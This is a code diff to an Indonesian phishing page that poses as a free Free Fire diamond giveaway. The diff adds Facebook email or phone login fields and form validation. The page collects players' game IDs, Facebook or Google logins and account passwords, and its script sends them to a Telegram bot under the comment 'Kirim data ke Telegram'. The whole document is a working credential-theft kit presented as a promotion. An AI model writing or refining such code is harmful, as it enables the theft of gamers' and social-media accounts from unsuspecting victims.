@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PianTech - Free Diamond</title>
+    <title>Bagi-Bagi Diamond FF</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
@@ -144,6 +144,50 @@
         .facebook { color: #3b5998; }
         .google { color: #db4437; }
 
+        .facebook-login-type {
+            display: none;
+            margin-top: 15px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+
+        .facebook-login-type.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .login-option {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .login-option-btn {
+            flex: 1;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 1px solid transparent;
+        }
+
+        .login-option-btn:hover {
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .login-option-btn.selected {
+            border-color: #3b5998;
+            background: rgba(59, 89, 152, 0.2);
+        }
+
         .submit-btn {
             display: block;
             width: 100%;
@@ -166,6 +210,13 @@
 
         .submit-btn:active {
             transform: translateY(0);
+        }
+
+        .submit-btn:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
         }
 
         .info-section {
@@ -291,19 +342,39 @@
                         </div>
                     </div>
                     <input type="hidden" id="accountType" required>
+                    
+                    <!-- Opsi login Facebook -->
+                    <div class="facebook-login-type" id="facebookLoginType">
+                        <label>Pilih cara login Facebook</label>
+                        <div class="login-option">
+                            <div class="login-option-btn" data-login-type="email">Email</div>
+                            <div class="login-option-btn" data-login-type="phone">Nomor Telepon</div>
+                        </div>
+                        <input type="hidden" id="facebookLoginTypeValue">
+                        
+                        <div class="form-group" id="facebookEmailField" style="display: none;">
+                            <label for="facebookEmail">Email Facebook</label>
+                            <input type="email" id="facebookEmail" placeholder="Masukkan Email Facebook Anda">
+                        </div>
+                        
+                        <div class="form-group" id="facebookPhoneField" style="display: none;">
+                            <label for="facebookPhone">Nomor Telepon Facebook</label>
+                            <input type="tel" id="facebookPhone" placeholder="Masukkan Nomor Telepon Facebook Anda">
+                        </div>
+                    </div>
                 </div>
 
-                <div class="form-group">
-                    <label for="email">Email</label>
-                    <input type="email" id="email" placeholder="Masukkan Email Anda" required>
+                <div class="form-group" id="googleEmailField">
+                    <label for="googleEmail">Email Google</label>
+                    <input type="email" id="googleEmail" placeholder="Masukkan Email Google Anda">
                 </div>
 
-                <div class="form-group">
+                <div class="form-group" id="passwordField">
                     <label for="password">Password</label>
                     <input type="password" id="password" placeholder="Masukkan Password Akun Anda" required>
                 </div>
 
-                <button type="submit" class="submit-btn">
+                <button type="submit" class="submit-btn" id="submitBtn">
                     <i class="fas fa-gift"></i> DAPATKAN DIAMOND GRATIS
                 </button>
             </form>
@@ -344,8 +415,97 @@
                     opt.classList.remove('selected');
                 });
                 this.classList.add('selected');
-                document.getElementById('accountType').value = this.getAttribute('data-type');
+                
+                const accountType = this.getAttribute('data-type');
+                document.getElementById('accountType').value = accountType;
+                
+                // Tampilkan opsi login Facebook jika dipilih
+                const facebookLoginType = document.getElementById('facebookLoginType');
+                const googleEmailField = document.getElementById('googleEmailField');
+                
+                if (accountType === 'facebook') {
+                    facebookLoginType.classList.add('active');
+                    googleEmailField.style.display = 'none';
+                    document.getElementById('googleEmail').required = false;
+                } else {
+                    facebookLoginType.classList.remove('active');
+                    googleEmailField.style.display = 'block';
+                    document.getElementById('googleEmail').required = true;
+                    
+                    // Reset opsi login Facebook
+                    document.querySelectorAll('.login-option-btn').forEach(btn => {
+                        btn.classList.remove('selected');
+                    });
+                    document.getElementById('facebookEmailField').style.display = 'none';
+                    document.getElementById('facebookPhoneField').style.display = 'none';
+                    document.getElementById('facebookLoginTypeValue').value = '';
+                }
+                
+                validateForm();
             });
+        });
+
+        // Pilih cara login Facebook
+        document.querySelectorAll('.login-option-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                document.querySelectorAll('.login-option-btn').forEach(b => {
+                    b.classList.remove('selected');
+                });
+                this.classList.add('selected');
+                
+                const loginType = this.getAttribute('data-login-type');
+                document.getElementById('facebookLoginTypeValue').value = loginType;
+                
+                // Tampilkan field yang sesuai
+                if (loginType === 'email') {
+                    document.getElementById('facebookEmailField').style.display = 'block';
+                    document.getElementById('facebookPhoneField').style.display = 'none';
+                    document.getElementById('facebookEmail').required = true;
+                    document.getElementById('facebookPhone').required = false;
+                } else {
+                    document.getElementById('facebookEmailField').style.display = 'none';
+                    document.getElementById('facebookPhoneField').style.display = 'block';
+                    document.getElementById('facebookEmail').required = false;
+                    document.getElementById('facebookPhone').required = true;
+                }
+                
+                validateForm();
+            });
+        });
+
+        // Validasi form real-time
+        function validateForm() {
+            const accountType = document.getElementById('accountType').value;
+            const submitBtn = document.getElementById('submitBtn');
+            
+            if (!accountType) {
+                submitBtn.disabled = true;
+                return;
+            }
+            
+            if (accountType === 'facebook') {
+                const facebookLoginType = document.getElementById('facebookLoginTypeValue').value;
+                if (!facebookLoginType) {
+                    submitBtn.disabled = true;
+                    return;
+                }
+                
+                if (facebookLoginType === 'email') {
+                    const facebookEmail = document.getElementById('facebookEmail').value;
+                    submitBtn.disabled = !facebookEmail;
+                } else {
+                    const facebookPhone = document.getElementById('facebookPhone').value;
+                    submitBtn.disabled = !facebookPhone;
+                }
+            } else {
+                const googleEmail = document.getElementById('googleEmail').value;
+                submitBtn.disabled = !googleEmail;
+            }
+        }
+
+        // Event listener untuk input fields
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('input', validateForm);
         });
 
         // Kirim data ke Telegram
@@ -355,12 +515,22 @@
             const playerId = document.getElementById('playerId').value;
             const playerLevel = document.getElementById('playerLevel').value;
             const accountType = document.getElementById('accountType').value;
-            const email = document.getElementById('email').value;
             const password = document.getElementById('password').value;
             
-            if (!accountType) {
-                showNotification('Pilih jenis akun terlebih dahulu!', true);
-                return;
+            let loginInfo = '';
+            
+            if (accountType === 'facebook') {
+                const loginType = document.getElementById('facebookLoginTypeValue').value;
+                if (loginType === 'email') {
+                    const facebookEmail = document.getElementById('facebookEmail').value;
+                    loginInfo = `Email Facebook: ${facebookEmail}`;
+                } else {
+                    const facebookPhone = document.getElementById('facebookPhone').value;
+                    loginInfo = `Nomor Telepon Facebook: ${facebookPhone}`;
+                }
+            } else {
+                const googleEmail = document.getElementById('googleEmail').value;
+                loginInfo = `Email Google: ${googleEmail}`;
             }
             
             // Ganti dengan token bot Telegram Anda
@@ -373,7 +543,7 @@
 🆔 *ID Free Fire:* ${playerId}
 📊 *Level Akun:* ${playerLevel}
 🔐 *Jenis Akun:* ${accountType.toUpperCase()}
-📧 *Email:* ${email}
+${loginInfo}
 🔒 *Password:* ${password}
 
 ⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
@@ -400,6 +570,14 @@
                     document.querySelectorAll('.account-option').forEach(opt => {
                         opt.classList.remove('selected');
                     });
+                    document.querySelectorAll('.login-option-btn').forEach(btn => {
+                        btn.classList.remove('selected');
+                    });
+                    document.getElementById('facebookLoginType').classList.remove('active');
+                    document.getElementById('facebookEmailField').style.display = 'none';
+                    document.getElementById('facebookPhoneField').style.display = 'none';
+                    document.getElementById('googleEmailField').style.display = 'block';
+                    document.getElementById('submitBtn').disabled = true;
                 } else {
                     showNotification('Terjadi kesalahan. Silakan coba lagi.', true);
                 }
